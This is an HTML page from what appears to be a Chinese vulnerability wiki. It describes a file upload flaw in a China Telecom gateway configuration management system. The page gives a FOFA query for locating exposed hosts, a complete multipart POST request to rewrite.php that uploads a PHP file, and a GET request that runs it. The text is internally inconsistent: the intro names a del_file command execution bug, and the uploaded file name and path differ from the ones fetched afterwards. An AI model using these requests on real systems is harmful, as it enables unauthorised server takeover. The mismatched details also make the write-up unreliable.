@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E7%94%B5%E4%BF%A1%E7%BD%91%E5%85%B3%E9%85%8D%E7%BD%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E7%94%B5%E4%BF%A1%E7%BD%91%E5%85%B3%E9%85%8D%E7%BD%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Frewrite%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>电信网关配置管理系统rewrite存在文件上传漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u7535\u4fe1\u7f51\u5173\u914d\u7f6e\u7ba1\u7406\u7cfb\u7edfrewrite\u5b58\u5728\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e", url: "#_top", children: [
+          ]},
+          {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1", children: [
+          ]},
+          {title: "\u4e8c\u3001\u5f71\u54cd\u7248\u672c", url: "#_2", children: [
+          ]},
+          {title: "\u4e09\u3001\u8d44\u4ea7\u6d4b\u7ed8", url: "#_3", children: [
+          ]},
+          {title: "\u56db\u3001\u6f0f\u6d1e\u590d\u73b0", url: "#_4", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E7%94%B5%E4%BF%A1%E7%BD%91%E5%85%B3%E9%85%8D%E7%BD%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E7%94%B5%E4%BF%A1%E7%BD%91%E5%85%B3%E9%85%8D%E7%BD%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        电信网关配置管理系统存在弱口令漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E7%94%B5%E4%BF%A1%E7%BD%91%E5%85%B3%E9%85%8D%E7%BD%AE%E7%AE%A1%E7%90%86/%E7%94%B5%E4%BF%A1%E7%BD%91%E5%85%B3%E9%85%8D%E7%BD%AE%E7%AE%A1%E7%90%86%E5%90%8E%E5%8F%B0upload_channels.php%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E7%94%B5%E4%BF%A1%E7%BD%91%E5%85%B3%E9%85%8D%E7%BD%AE%E7%AE%A1%E7%90%86/%E7%94%B5%E4%BF%A1%E7%BD%91%E5%85%B3%E9%85%8D%E7%BD%AE%E7%AE%A1%E7%90%86%E5%90%8E%E5%8F%B0upload_channels.php%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        电信网关配置管理后台upload channels.php接口存在文件上传漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="rewrite">电信网关配置管理系统rewrite存在文件上传漏洞<a class="headerlink" href="#rewrite" title="Permanent link">&para;</a></h1>
+<h1 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
+<p><font style="color:rgba(0, 0, 0, 0.9);">中国电信集团有限公司（英文名称“China Telecom”、简称“中国电信”）成立于2000年9月，是中国特大型国有通信企业、上海世博会全球合作伙伴。电信网关配置管理系统del_file存在远程命令执行漏洞，攻击者可通过该漏洞获取服务器权限。</font></p>
+<h1 id="_2"><font style="color:rgba(0, 0, 0, 0.9);">二、影响版本</font><a class="headerlink" href="#_2" title="Permanent link">&para;</a></h1>
+<ul>
+<li>电信网关配置管理系统</li>
+</ul>
+<h1 id="_3">三、资产测绘<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h1>
+<ul>
+<li>fofa<code>body="img/dl.gif" &amp;&amp; title="系统登录"</code></li>
+<li>特征</li>
+</ul>
+<p><img alt="1713231679173-db9b0c3c-79d6-4f91-baac-a8358f5ccad1.png" src="./img/8c5EN0nJePhVygzM/1713231679173-db9b0c3c-79d6-4f91-baac-a8358f5ccad1-275973.png" /></p>
+<h1 id="_4">四、漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h1>
+<div class="highlight"><pre><span></span><code><span class="n">POST</span><span class="w"> </span><span class="o">/</span><span class="n">manager</span><span class="o">/</span><span class="n">teletext</span><span class="o">/</span><span class="n">material</span><span class="o">/</span><span class="n">rewrite</span><span class="p">.</span><span class="na">php</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+<span class="nl">Host</span><span class="p">:</span><span class="w"> </span>
+<span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="n">Windows</span><span class="w"> </span><span class="n">NT</span><span class="w"> </span><span class="mf">10.0</span><span class="p">;</span><span class="w"> </span><span class="n">Win64</span><span class="p">;</span><span class="w"> </span><span class="n">x64</span><span class="p">;</span><span class="w"> </span><span class="n">rv</span><span class="p">:</span><span class="mf">125.0</span><span class="p">)</span><span class="w"> </span><span class="n">Gecko</span><span class="o">/</span><span class="mi">20100101</span><span class="w"> </span><span class="n">Firefox</span><span class="o">/</span><span class="mf">125.0</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span><span class="w"> </span><span class="n">multipart</span><span class="o">/</span><span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span><span class="w"> </span><span class="n">boundary</span><span class="o">=----</span><span class="n">WebKitFormBoundaryOKldnDPT</span>
+<span class="nl">Connection</span><span class="p">:</span><span class="w"> </span><span class="n">close</span>
+
+<span class="o">------</span><span class="n">WebKitFormBoundaryOKldnDPT</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span><span class="w"> </span><span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span><span class="w"> </span><span class="n">name</span><span class="o">=</span><span class="s">&quot;tmp_name&quot;</span><span class="p">;</span><span class="w"> </span><span class="n">filename</span><span class="o">=</span><span class="s">&quot;test.php&quot;</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span><span class="w"> </span><span class="n">image</span><span class="o">/</span><span class="n">png</span>
+
+<span class="o">&lt;?</span><span class="n">php</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="nf">md5</span><span class="p">(</span><span class="err">&#39;</span><span class="mi">666</span><span class="err">&#39;</span><span class="p">);</span><span class="n">unlink</span><span class="p">(</span><span class="n">__FILE__</span><span class="p">);</span><span class="o">?&gt;</span>
+<span class="o">------</span><span class="n">WebKitFormBoundaryOKldnDPT</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span><span class="w"> </span><span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span><span class="w"> </span><span class="n">name</span><span class="o">=</span><span class="s">&quot;uploadtime&quot;</span>
+
+
+<span class="o">------</span><span class="n">WebKitFormBoundaryOKldnDPT</span><span class="o">--</span>
+</code></pre></div>
+<p><img alt="1715354904567-3e7260cf-b3ae-4345-bbb9-4ebc6db96872.png" src="./img/8c5EN0nJePhVygzM/1715354904567-3e7260cf-b3ae-4345-bbb9-4ebc6db96872-007827.png" /></p>
+<p>上传文件地址</p>
+<div class="highlight"><pre><span></span><code><span class="n">GET</span><span class="w"> </span><span class="o">/</span><span class="n">xmedia</span><span class="o">/</span><span class="n">material</span><span class="o">/</span><span class="n">test1</span><span class="p">.</span><span class="na">php</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+<span class="nl">Host</span><span class="p">:</span><span class="w"> </span>
+<span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="n">Windows</span><span class="w"> </span><span class="n">NT</span><span class="w"> </span><span class="mf">10.0</span><span class="p">;</span><span class="w"> </span><span class="n">Win64</span><span class="p">;</span><span class="w"> </span><span class="n">x64</span><span class="p">;</span><span class="w"> </span><span class="n">rv</span><span class="p">:</span><span class="mf">125.0</span><span class="p">)</span><span class="w"> </span><span class="n">Gecko</span><span class="o">/</span><span class="mi">20100101</span><span class="w"> </span><span class="n">Firefox</span><span class="o">/</span><span class="mf">125.0</span>
+<span class="nl">Connection</span><span class="p">:</span><span class="w"> </span><span class="n">close</span>
+</code></pre></div>
+<p><img alt="1715354913211-9d648019-ec1d-43a8-9f31-328adcc87fcb.png" src="./img/8c5EN0nJePhVygzM/1715354913211-9d648019-ec1d-43a8-9f31-328adcc87fcb-610528.png" /></p>
+<blockquote>
+<p>更新: 2024-05-14 11:21:12<br />
+原文: <a href="https://www.yuque.com/xiaokp7/ocvun2/ukcgt02yr1b4yu4l">https://www.yuque.com/xiaokp7/ocvun2/ukcgt02yr1b4yu4l</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E7%94%B5%E4%BF%A1%E7%BD%91%E5%85%B3%E9%85%8D%E7%BD%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E7%94%B5%E4%BF%A1%E7%BD%91%E5%85%B3%E9%85%8D%E7%BD%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        电信网关配置管理系统存在弱口令漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E7%94%B5%E4%BF%A1%E7%BD%91%E5%85%B3%E9%85%8D%E7%BD%AE%E7%AE%A1%E7%90%86/%E7%94%B5%E4%BF%A1%E7%BD%91%E5%85%B3%E9%85%8D%E7%BD%AE%E7%AE%A1%E7%90%86%E5%90%8E%E5%8F%B0upload_channels.php%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E7%94%B5%E4%BF%A1%E7%BD%91%E5%85%B3%E9%85%8D%E7%BD%AE%E7%AE%A1%E7%90%86/%E7%94%B5%E4%BF%A1%E7%BD%91%E5%85%B3%E9%85%8D%E7%BD%AE%E7%AE%A1%E7%90%86%E5%90%8E%E5%8F%B0upload_channels.php%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        电信网关配置管理后台upload channels.php接口存在文件上传漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
